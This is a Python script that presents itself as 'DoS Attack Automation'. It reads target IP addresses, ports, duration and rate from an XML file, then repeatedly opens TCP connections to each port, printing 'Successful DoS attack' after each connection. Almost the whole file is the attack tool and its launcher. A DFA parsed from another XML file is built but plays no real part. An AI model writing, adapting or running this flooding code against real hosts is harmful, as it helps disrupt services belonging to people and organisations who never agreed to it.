import xml.etree.ElementTree as ET
import socket
import time
import sys
import pyfiglet
from colorama import init
from termcolor import cprint 
from pyfiglet import figlet_format

class DFA:
    def __init__(self, states, alphabet, transitions, initial, accepting):
        self.states = states
        self.alphabet = alphabet
        self.transitions = transitions
        self.current_state = initial
        self.accepting_states = accepting

    def transition(self, symbol):
        for transition in self.transitions:
            if transition['from'] == self.current_state and transition['read'] == symbol:
                self.current_state = transition['to']
                return True
        return False

    def is_accepting(self):
        return self.current_state in self.accepting_states


def parse_automation_xml(file_path):
    tree = ET.parse(file_path)
    root = tree.getroot()

    states = []
    alphabet = []
    transitions = []
    initial_state = None
    accepting_states = []

    for state in root.findall('.//state'):
        states.append(state.attrib['id'])
        if 'accepting' in state.attrib and state.attrib['accepting'] == 'true':
            accepting_states.append(state.attrib['id'])

    for symbol in root.findall('.//symbol'):
        alphabet.append(symbol.text)

    for transition in root.findall('.//transition'):
        transitions.append({
            'from': transition.find('from').text,
            'to': transition.find('to').text,
            'read': transition.find('read').text
        })

    initial_state = root.find('.//initial').attrib['id']

    return states, alphabet, transitions, initial_state, accepting_states


def dos_attack(ip, port, power, duration):
    try:
        end_time = time.time() + duration
        
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((ip, port))
                print(f"Successful DoS attack -> {ip}:{port}")
            except Exception as e:
                print(f"Attack failed: {e}")
            finally:
                sock.close()
                
            time.sleep(1 / power)  # Power
    except KeyboardInterrupt:
        print("Attack stopped. KEYBOARD INTERRUPT")
        sys.exit()
    except socket.error:
        print("An error occurred while connecting to the target.")
        sys.exit()

def simulate_dfa(states, alphabet, transitions, initial_state, accepting_states):
    dfa = DFA(states, alphabet, transitions, initial_state, accepting_states)
    input_xml = "attack.xml"

    try:
        tree = ET.parse(input_xml)
        root = tree.getroot()

        for attack in root.findall('.//Attack'):
            ip_address = attack.find('IpAddress').text
            common_ports = attack.find('CommonPorts').text
            port_numbers = [int(port.text) for port in attack.findall('PortNumbers/PortNumber')]
            duration = int(attack.find('Duration').text)
            power = int(attack.find('Power').text)

            print(f"Performing attack on {ip_address}...")
            print("ports to attack:", port_numbers)

            for port in port_numbers:
                print(f"Attacking port {port} with power {power} for {duration} seconds...")
                #attack
                dos_attack(ip_address, port, power, duration)

        print("Attack automation completed.")

    except FileNotFoundError:
        print(f"Error: {input_xml} file not found.")


def main():
    init(strip=not sys.stdout.isatty())
    #ascii_art = pyfiglet.figlet_format("DoS Attack Automation")
    #print(ascii_art)
    cprint(figlet_format('DOS!!!', font='starwars'),
       'yellow', 'on_red', attrs=['bold'])
    cprint(figlet_format('ATTACK!', font='starwars'),
       'yellow', 'on_red', attrs=['bold'])
    print("Attack begins...")
    #wait 2 seconds
    time.sleep(4)
    automation_xml = "automation.xml"
    states, alphabet, transitions, initial_state, accepting_states = parse_automation_xml(automation_xml)
    simulate_dfa(states, alphabet, transitions, initial_state, accepting_states)


if __name__ == "__main__":
    main()
